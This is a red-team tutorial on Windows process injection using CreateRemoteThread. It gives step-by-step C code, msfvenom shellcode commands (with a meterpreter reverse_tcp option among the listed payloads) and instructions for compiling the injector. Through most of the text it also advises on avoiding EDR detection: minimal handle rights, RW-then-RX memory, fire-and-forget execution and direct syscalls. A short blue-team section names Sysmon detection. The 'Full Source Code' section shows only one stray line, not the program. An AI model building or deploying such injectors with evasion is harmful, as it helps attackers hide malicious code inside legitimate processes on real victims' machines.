What Is Process Injection?

Process injection is a technique where an attacker writes and executes code inside the memory space of another running process. Instead of starting a new malicious process — which is noisy and easily detected — the shellcode lives inside a legitimate one. To a process list, to an AV scanner, to a casual analyst, it looks like notepad.exe is just running. Nothing suspicious.

The technique covered here is the most foundational form: CreateRemoteThread injection. It uses four Win32 API calls in sequence to accomplish the entire attack. Understand this one deeply and every more advanced injection variant (APC injection, early bird, thread hijacking, process hollowing) will make immediate sense — they're all solving the same problem with different levels of stealth.

Full Source Code

Before breaking it down piece by piece, here is the complete program. Read through it once, then follow the step-by-step breakdown below.

                dwPID = pe32.th32ProcessID;

Step 1 — Process Enumeration with Toolhelp32

01 FIND THE TARGET PID

Before you can inject into a process you need its Process ID (PID) — the numeric identifier the kernel uses to track it. Windows doesn't give you a direct "find process by name" API, so the standard approach is to take a snapshot of the entire process list and walk through it.

C 
const char* TargetProcess = "notepad.exe";
DWORD dwPID = 0;

// Take a snapshot of all running processes at this moment in time
HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

// PROCESSENTRY32 holds info for one process: PID, parent PID, exe name, etc.
PROCESSENTRY32 pe32;
pe32.dwSize = sizeof(PROCESSENTRY32);  // MUST be set before calling Process32First

if(Process32First(hSnap, &pe32)) {
    do {
        // Case-insensitive compare: "notepad.exe" == "Notepad.EXE" → true
        if(_stricmp(pe32.szExeFile, TargetProcess) == 0) {
            dwPID = pe32.th32ProcessID;
            break;
        }
    } while(Process32Next(hSnap, &pe32));
}
CloseHandle(hSnap);  // Always close the snapshot handle

What is a snapshot?

CreateToolhelp32Snapshot asks the kernel for a frozen copy of process/thread/module state at that exact moment. Think of it as a photograph of the process list. The flag TH32CS_SNAPPROCESS tells it we only want the process table — there are equivalent flags for threads (TH32CS_SNAPTHREAD) and loaded modules (TH32CS_SNAPMODULE).

The PROCESSENTRY32 structure is critical — and the dwSize field must be initialized to sizeof(PROCESSENTRY32) before calling Process32First. This is a common Win32 pattern where the API uses the size field to version-check the structure. Forgetting it causes an immediate ERROR_INSUFFICIENT_BUFFER failure.

WIN32 API Process32First / Process32Next
BOOL Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);

Process32First retrieves the first entry from the snapshot and fills lppe. Process32Next advances to the next. Returns FALSE when the list is exhausted — that's the loop termination condition. The szExeFile field of PROCESSENTRY32 holds the executable name (e.g. "notepad.exe").

MSDN Documentation ↗
Red team note: Calling CreateToolhelp32Snapshot generates a kernel event that EDRs monitor. More advanced tradecraft uses NtQuerySystemInformation with SystemProcessInformation via direct syscall to enumerate processes without touching the Toolhelp API at all.

Step 2 — Opening the Target Process

02 ACQUIRE A PROCESS HANDLE

With the PID in hand, the next step is acquiring a handle to that process — a kernel-managed reference object that lets us interact with it. The critical choice here is which access rights to request.

C 
// PROCESS_ALL_ACCESS grants every permission: read, write, execute, terminate, etc.
// For a stealth injector you would request only:
// PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD
hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);

if(hProcess == NULL) {
    printf("Error opening process: %lu\n", GetLastError());
    return 1;
}

PROCESS_ALL_ACCESS is the "give me everything" flag. It works well in a lab but it's also maximally detectable — any EDR monitoring process handle grants will immediately flag this. In a real engagement, you request the minimum rights needed:

Access RightRequired For
PROCESS_VM_OPERATIONVirtualAllocEx — allocating memory in the target
PROCESS_VM_WRITEWriteProcessMemory — writing shellcode bytes
PROCESS_CREATE_THREADCreateRemoteThread — spawning the execution thread
PROCESS_VM_READOptional — reading back memory to verify the write

Step 3 — Allocating Remote Memory

03 CARVE OUT SPACE FOR THE PAYLOAD

Now we have a handle. The shellcode needs somewhere to live inside the target process's virtual address space. VirtualAllocEx is the remote version of VirtualAlloc — it performs the allocation in another process rather than the calling one.

C 
SIZE_T PayloadSize = 1024;  // Allocate 1KB — enough for small shellcode payloads

LPVOID RemoteBuffer = VirtualAllocEx(
    hProcess,               // handle to target process
    NULL,                   // let the OS choose the address (no preferred location)
    PayloadSize,            // size in bytes to allocate
    MEM_COMMIT | MEM_RESERVE,   // reserve VA range AND commit physical backing
    PAGE_EXECUTE_READWRITE  // RWX: readable, writable, AND executable
);

if(RemoteBuffer == NULL) {
    printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
    CloseHandle(hProcess);
    return 1;
}
printf("[+] Allocated remote buffer at: %p\n", RemoteBuffer);

MEM_COMMIT | MEM_RESERVE — what's the difference?

MEM_RESERVE stakes out a range in virtual address space — it claims the addresses, but no physical memory or pagefile space is committed yet. MEM_COMMIT backs the reserved range with actual memory pages. You need both together for a usable allocation. Using only MEM_RESERVE would give you addresses that fault immediately on access.

PAGE_EXECUTE_READWRITE — the loud flag

PAGE_EXECUTE_READWRITE (RWX) means the region can be read, written, and executed. For a lab this is fine. In a real engagement this is a screaming detection signal — allocating RWX memory in a remote process is one of the highest-confidence indicators of code injection monitored by every EDR on the market.

The stealthy approach is to use a two-step model: allocate as PAGE_READWRITE, write the shellcode, then change protection to PAGE_EXECUTE_READ using VirtualProtectEx. This is harder to detect because no page is ever simultaneously writable and executable.

Step 4 — Generating Shellcode with msfvenom

04 BUILD THE PAYLOAD

Shellcode is raw machine code — bytes that the CPU executes directly, with no loader, no imports, no file headers. It has to be position-independent: it can't rely on being at any specific address because we're placing it in whatever address VirtualAllocEx returned.

msfvenom is the payload generator from the Metasploit Framework. It handles all the complexity of building position-independent shellcode, applying encoders to remove bad characters, and outputting in the format you need.

⚙ MSFVENOM — SHELLCODE GENERATION REFERENCE

// Basic syntax: msfvenom -p <payload> [options] -b <bad_chars> -f <format>

Bash 
# The command used to generate the shellcode in this post:
# Payload: windows/exec — executes a command on the target
# CMD: the command to run (calc.exe, notepad.exe, cmd.exe, etc.)
# -b '\x00' — remove null bytes (bad chars that break strlen-based size calculation)
# -f c — output as a C-style char array (matches our const char* variable)
msfvenom -p windows/exec CMD=calc.exe -b '\x00' -f c

# Other useful payload examples:
msfvenom -p windows/exec CMD=notepad.exe -b '\x00' -f c
msfvenom -p windows/exec CMD=cmd.exe    -b '\x00' -f c

# For a 64-bit target process, use the x64 payload variant:
msfvenom -p windows/x64/exec CMD=calc.exe -b '\x00' -f c
FlagWhat It DoesExample Values
-pPayload selection — the type of shellcode to generatewindows/exec, windows/x64/exec, windows/meterpreter/reverse_tcp
CMD=The command to execute (specific to windows/exec payload)calc.exe, notepad.exe, cmd.exe /k whoami
-bBad characters to exclude from the shellcode. The encoder rewrites bytes to avoid these.'\x00' (null), '\x0a\x0d' (newline+CR), '\x00\xff'
-fOutput format — how the shellcode bytes are formatted in the output filec (C array), python, raw, hex, exe

Why remove null bytes with -b '\x00'?

The code uses strlen(MyPayload) + 1 to calculate shellcode size. strlen counts until it hits a \x00 (null terminator). If the shellcode contains a null byte anywhere in the middle, strlen stops early and WriteProcessMemory copies an incomplete payload — resulting in a crash or silent failure. The -b '\x00' flag tells msfvenom's encoder to rewrite the shellcode so no null bytes appear in the final output.

// BETTER PRACTICE
Instead of relying on strlen — which is fragile and only works on null-terminated shellcode — use a fixed-size byte array: unsigned char MyPayload[] = { ... }; and pass sizeof(MyPayload) to WriteProcessMemory. This works correctly regardless of embedded null bytes.

Step 5 — Writing Shellcode with WriteProcessMemory

05 COPY THE PAYLOAD

The memory is allocated. The shellcode is ready. Now we copy the bytes across process boundaries into the remote buffer using WriteProcessMemory.

C 
SIZE_T SizeofShellcode = strlen(MyPayload) + 1;

BOOL isWritten = WriteProcessMemory(
    hProcess,           // target process handle
    RemoteBuffer,       // destination address INSIDE the target process
    MyPayload,          // source buffer — shellcode bytes in OUR process
    SizeofShellcode,    // number of bytes to copy
    NULL                // optional: pointer to receive actual bytes written
);

if(!isWritten) {
    printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
    CloseHandle(hProcess);
    return 1;
}
printf("[+] Shellcode written successfully!\n");

What's happening under the hood: WriteProcessMemory is a kernel operation that temporarily suspends page protection on the target region, performs the cross-process memory copy, then restores the protection. It's essentially the same mechanism used by debuggers to set software breakpoints. The kernel validates both addresses — source must be readable in our process, destination must be writable in the target.

Step 6 — Executing via CreateRemoteThread

06 PULL THE TRIGGER

The shellcode is sitting in the target process's memory, waiting. CreateRemoteThread is the final step — it asks the OS to create a new execution thread inside the target process, starting at the address of our shellcode. From that point the payload is running as part of notepad.exe.

C 
HANDLE hThread = CreateRemoteThread(
    hProcess,                              // target process
    NULL,                                  // default security descriptor for the thread
    0,                                     // default stack size
    (LPTHREAD_START_ROUTINE)RemoteBuffer,  // start address = shellcode location
    NULL,                                  // no parameter passed to thread function
    0,                                     // thread runs immediately (not suspended)
    NULL                                   // we don't need the thread ID
);

if(hThread == NULL) {
    printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
} else {
    printf("[+] Remote thread executing shellcode...\n");
    // Block until the thread finishes (calc.exe opens and closes)
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
}

CloseHandle(hProcess);

The cast (LPTHREAD_START_ROUTINE)RemoteBuffer deserves attention. LPTHREAD_START_ROUTINE is the function pointer type for thread start routines — DWORD WINAPI ThreadProc(LPVOID lpParameter). Our shellcode obviously doesn't have that signature, but the cast tells the compiler to treat the address as if it does. The CPU doesn't know or care — it will jump to that address and start executing whatever bytes are there.

WaitForSingleObject(hThread, INFINITE) blocks our injector process until the remote thread finishes. For a calc.exe payload that means waiting until the calculator closes. In real tooling you wouldn't wait — you'd fire and forget, immediately closing all handles to reduce your footprint.

Compiling with GCC / MinGW

This code targets the Windows API so it must be compiled with a Windows-compatible compiler. MinGW-w64 (Minimalist GNU for Windows) provides GCC with the full Win32 SDK headers and libraries. You can compile natively on Windows or cross-compile from Linux.

On Windows (MinGW-w64 installed)

Bash / CMD 
# 32-bit target (x86) — matches windows/exec payload (no /x64)
gcc basic-process-injector.c -o injector32.exe -m32

# 64-bit target (x86_64) — matches windows/x64/exec payload
gcc basic-process-injector.c -o injector64.exe -m64

# If compilation gives linker errors for Win32 APIs, add the library flags explicitly:
gcc basic-process-injector.c -o injector.exe -m64 -lkernel32 -luser32

# Optional: strip debug symbols to reduce binary size
gcc basic-process-injector.c -o injector.exe -m64 -s

Cross-compiling from Linux (Kali / Parrot)

Bash 
# Install MinGW cross-compiler on Debian/Kali/Ubuntu:
sudo apt install mingw-w64 -y

# Cross-compile for 64-bit Windows from Linux:
x86_64-w64-mingw32-gcc basic-process-injector.c -o injector64.exe

# Cross-compile for 32-bit Windows from Linux:
i686-w64-mingw32-gcc basic-process-injector.c -o injector32.exe

# With explicit library linkage if needed:
x86_64-w64-mingw32-gcc basic-process-injector.c -o injector64.exe \
    -lkernel32 -luser32 -static-libgcc
// 32-BIT vs 64-BIT MATTERS
The shellcode architecture must match the target process architecture. A 32-bit shellcode (windows/exec) injected into a 64-bit process (notepad.exe on a 64-bit Windows) will crash immediately. Use windows/x64/exec for 64-bit targets and compile with -m64. To check: notepad.exe on 64-bit Windows is a 64-bit process. notepad.exe in C:\Windows\SysWOW64\ is the 32-bit version.

Verify compilation succeeded

Bash

file injector64.exe
# Expected: PE32+ executable (console) x86-64

file injector32.exe
# Expected: PE32 executable (console) Intel 80386

Detection & Blue Team Notes

Every step of CreateRemoteThread injection leaves artifacts. Understanding what they are is essential for building detection and for evolving the technique toward better evasion.

// THE LOUDEST SIGNAL
Sysmon Event ID 8 (CreateRemoteThread) is logged every time this technique is used without evasion. It records: the source process, the target process, the start address, and the start module — which will show as outside any loaded DLL when pointing to a raw shellcode allocation. This is one of the most reliable detections for this classic technique.

What Comes Next

CreateRemoteThread injection is the foundation. Every technique that comes after it is an answer to the question: "how do we do the same thing with fewer detection signals?"

  • APC Injection — Instead of creating a new thread, queue an Asynchronous Procedure Call to an existing thread in the target. Less noisy than spawning a new thread. Uses QueueUserAPC + alertable thread states.
  • Early Bird APC — Create the target process in a suspended state, inject shellcode before any of its code runs, then resume. The shellcode executes before any security products have had a chance to initialize in that process.
  • Thread Hijacking — Suspend an existing thread with SuspendThread, modify its instruction pointer via SetThreadContext to point at shellcode, then resume. No new threads created at all.
  • Process Hollowing — Create a legitimate process suspended, unmap its image from memory, replace it with a malicious PE, fix up the entry point, and resume. The process list shows the legitimate name with malicious code.
  • Direct Syscalls — Replace the Win32 API calls (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx) with direct syscall invocations, bypassing user-land EDR hooks entirely.
Key insight: The detection problem for defenders is that the underlying kernel operations for all these techniques are identical — allocate memory, write bytes, redirect execution. What changes is which Win32 APIs are called, and therefore which hooks and callbacks fire. The most advanced techniques avoid user-land APIs entirely.
